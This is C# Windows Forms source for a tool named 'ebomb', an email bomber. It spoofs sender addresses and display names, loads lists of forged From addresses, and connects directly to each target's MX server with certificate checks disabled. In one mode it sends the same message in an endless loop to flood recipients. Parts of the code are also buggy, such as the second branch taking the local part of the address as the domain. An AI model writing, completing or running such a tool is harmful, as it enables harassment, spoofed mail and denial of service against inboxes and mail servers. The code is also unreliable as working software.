using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PuppeteerSharp;
using DnsClient;
using System.Net.Mail;
using MailKit;
using MailKit.Security;
using MailKit.Net;
using MailKit.Net.Smtp;
using MailKit.Net.Imap;
using MailKit.Net.Pop3;
using MimeKit;
using System.Windows.Interop;
using System.Diagnostics;
using M15A3_MCWS.Properties;
using DnsClient.Protocol;
namespace M15A3_MCWS
{
    public partial class ebomb : Form
    {
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
(
    int nLeftRect,     // x-coordinate of upper-left corner
    int nTopRect,      // y-coordinate of upper-left corner
    int nRightRect,    // x-coordinate of lower-right corner
    int nBottomRect,   // y-coordinate of lower-right corner
    int nWidthEllipse, // width of ellipse
    int nHeightEllipse // height of ellipse
);
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();
        private void panel1_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        public ebomb()
        {
            InitializeComponent();
            this.AutoScaleMode = AutoScaleMode.Dpi;
            this.FormBorderStyle = FormBorderStyle.None;
        }
        OpenFileDialog of = new OpenFileDialog();
        OpenFileDialog opf = new OpenFileDialog();
        private void pictureBox2_Click_1(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureBox3_Click_1(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void pictureBox4_Click_1(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Minimized)
            {
                this.WindowState = FormWindowState.Minimized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void ebomb_Load(object sender, EventArgs e)
        {
            this.AutoScaleMode = AutoScaleMode.Dpi;
            textBox1.Text = Settings.Default.defaultDnsResolver;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            content.SelectionFont = new Font(content.Font, FontStyle.Italic);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            content.SelectionFont = new Font(content.Font, FontStyle.Bold);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            content.SelectionFont = new Font(content.Font, FontStyle.Underline);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            fontDialog1.ShowDialog();
            content.SelectionFont = fontDialog1.Font;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            colorDialog1.ShowDialog();
            content.BackColor = colorDialog1.Color;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            colorDialog1.ShowDialog();
            content.ForeColor = colorDialog1.Color;
        }

        private void button7_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFile = new OpenFileDialog();
                content.Text = File.ReadAllText(openFile.FileName);
            }
            catch (Exception x)
            {
                MessageBox.Show(x.Message, "M17 MCWS - Exception", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        string[] srcEmails;
        private void button8_Click(object sender, EventArgs e)
        {
            try
            {
                of.ShowDialog();
                srcEmails = File.ReadAllLines(of.FileName);
            }
            catch (Exception x)
            {
                MessageBox.Show(x.Message, "M17 MCWS - Exception", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        List<string> atts = new List<string>();
        int i = 0;
        private void button12_Click(object sender, EventArgs e)
        {
            try
            {
                opf.ShowDialog();
                atts.Add(opf.FileName);
            }
            catch (Exception x)
            {
                MessageBox.Show(x.Message, "M17 MCWS - Exception", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        Dictionary<string, string> dict = new Dictionary<string, string>();
        private async void spam_Click(object sender, EventArgs e)
        {
            try
            {
                if (semi.Checked)
                {
                    var msg = new MimeMessage();
                    switch (trackBar1.Value)
                    {
                        case 0:
                            msg.Priority = MessagePriority.NonUrgent;
                            msg.XPriority = XMessagePriority.Low;
                            break;
                        case 1:
                            msg.Priority = MessagePriority.Normal;
                            msg.XPriority = XMessagePriority.Normal;
                            break;
                        case 2:
                            msg.Priority = MessagePriority.Urgent;
                            msg.XPriority = XMessagePriority.Highest;
                            break;
                        default:
                            msg.Priority = MessagePriority.Normal;
                            msg.XPriority = XMessagePriority.Normal;
                            break;
                    }
                    msg.Date = DateTime.Now;
                    string[] ems = target.Text.Split(',');
                    foreach (string em in ems)
                    {
                        msg.To.Add(InternetAddress.Parse(em));
                    }
                    if (checkBox1.Checked)
                    {
                        int x = 0;
                        foreach (string em in srcEmails)
                        {
                            msg.From.Add(InternetAddress.Parse(em));
                            msg.From[0].Name = name1.Text;
                        }
                    }
                    else
                    {
                        msg.From.Add(InternetAddress.Parse(src.Text));
                        msg.From[0].Name = name1.Text;
                    }
                    BodyBuilder builder = new BodyBuilder();
                    if (checkBox4.Checked)
                    {
                        foreach (string att in atts)
                        {
                            FileStream fs = new FileStream(att, FileMode.Open);
                            builder.Attachments.Add(fs.Name, fs);
                        }
                    }
                    TextPart body = new TextPart("plain");
                    body.Text = content.Text;
                    builder.TextBody = content.Text;
                    msg.Body = builder.ToMessageBody();
                    msg.Subject = subject.Text;
                    msg.Date = DateTime.Now;
                    msg.Sender = MailboxAddress.Parse(src.Text);
                    MailKit.Net.Smtp.SmtpClient smtp = new MailKit.Net.Smtp.SmtpClient();
                    foreach (string em in ems)
                    {
                        LookupClient lc = new LookupClient(IPAddress.Parse(Settings.Default.defaultDnsResolver));
                        string domain = em.Split('@')[1];
                        IDnsQueryResponse resp = lc.Query(domain, QueryType.MX);
                        IEnumerable<MxRecord> mxServers = resp.AllRecords.MxRecords();
                        string mxDomain = mxServers.ToArray<MxRecord>()[0].Exchange;
                        smtp.RequireTLS = false;
                        smtp.CheckCertificateRevocation = false;
                        smtp.ServerCertificateValidationCallback = (sender, certificate, chain, errors) => true;
                        smtp.Timeout = 10000;
                        if (checkBox5.Checked)
                        {
                            smtp.Connect(mxDomain, (int)numericUpDown1.Value, SecureSocketOptions.SslOnConnect);
                        }
                        else
                        {
                            smtp.Connect(mxDomain, (int)numericUpDown1.Value, SecureSocketOptions.None);
                        }
                        if (checkBox3.Checked)
                        {
                            smtp.Authenticate(textBox3.Text, textBox4.Text);
                        }
                        smtp.Send(msg);
                        smtp.Disconnect(true);
                    }
                }
                else
                {
                    var msg = new MimeMessage();
                    switch (trackBar1.Value)
                    {
                        case 0:
                            msg.Priority = MessagePriority.NonUrgent;
                            break;
                        case 1:
                            msg.Priority = MessagePriority.Normal;
                            break;
                        case 2:
                            msg.Priority = MessagePriority.Urgent;
                            break;
                        default:
                            msg.Priority = MessagePriority.Normal;
                            break;
                    }
                    msg.Date = DateTime.Now;
                    string[] ems = target.Text.Split(',');
                    foreach (string em in ems)
                    {
                        msg.To.Add(InternetAddress.Parse(em));
                    }
                    if (checkBox1.Checked)
                    {
                        int x = 0;
                        foreach (string em in srcEmails)
                        {
                            msg.From.Add(InternetAddress.Parse(em));
                            msg.From[0].Name = name1.Text;
                        }
                    }
                    else
                    {
                        msg.From.Add(InternetAddress.Parse(src.Text));
                        msg.From[0].Name = name1.Text;
                    }
                    BodyBuilder builder = new BodyBuilder();
                    if (checkBox4.Checked)
                    {
                        foreach (string att in atts)
                        {
                            FileStream fs = new FileStream(att, FileMode.Open);
                            builder.Attachments.Add(fs.Name, fs);
                        }
                    }
                    TextPart body = new TextPart("plain");
                    body.Text = content.Text;
                    builder.TextBody = content.Text;
                    if (checkBox6.Checked)
                    {
                        msg.Importance = MessageImportance.High;
                    }
                    msg.Body = builder.ToMessageBody();
                    msg.Subject = subject.Text;
                    msg.Sender = MailboxAddress.Parse(src.Text);

                    MailKit.Net.Smtp.SmtpClient smtp = new MailKit.Net.Smtp.SmtpClient();
                    foreach (string em in ems)
                    {
                        LookupClient lc = new LookupClient(IPAddress.Parse(Settings.Default.defaultDnsResolver));
                        string domain = em.Split('@')[0];
                        IDnsQueryResponse resp = lc.Query(domain, QueryType.MX);
                        string mxDomain = resp.Answers[0].DomainName.ToString();
                        smtp.CheckCertificateRevocation = false;
                        smtp.ServerCertificateValidationCallback = (sender, certificate, chain, errors) => true;
                        smtp.Timeout = 10000;
                        if (checkBox5.Checked)
                        {
                            smtp.Connect(mxDomain, (int)numericUpDown1.Value, SecureSocketOptions.SslOnConnect);
                        }
                        else
                        {
                            smtp.Connect(mxDomain, (int)numericUpDown1.Value, SecureSocketOptions.None);
                        }
                        if (checkBox3.Checked)
                        {
                            smtp.Authenticate(textBox3.Text, textBox4.Text);
                        }
                        while (true)
                        {
                            smtp.Send(msg);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Settings.Default.defaultDnsResolver = textBox1.Text;
            Settings.Default.Save();
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
